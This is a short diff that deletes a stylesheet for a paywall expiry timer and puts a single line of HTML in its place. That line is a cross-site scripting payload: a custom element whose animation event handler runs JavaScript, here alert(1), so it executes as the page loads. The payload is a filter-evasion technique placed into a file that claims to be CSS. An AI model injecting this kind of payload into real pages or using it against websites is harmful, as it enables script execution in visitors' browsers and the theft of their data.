@@ -1,18 +1,1 @@
-#paywallExpiresTimer {
-    animation: border-pulsate 2s infinite;
-    border: 3px solid cyan
-  }
-  
-  @keyframes border-pulsate {
-    0% {
-      border-color: rgba(255, 0, 0, 1);
-    }
-  
-    50% {
-      border-color: rgba(0, 255, 255, 0);
-    }
-  
-    100% {
-      border-color: rgba(255, 0, 0, 1);
-    }
-  }
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
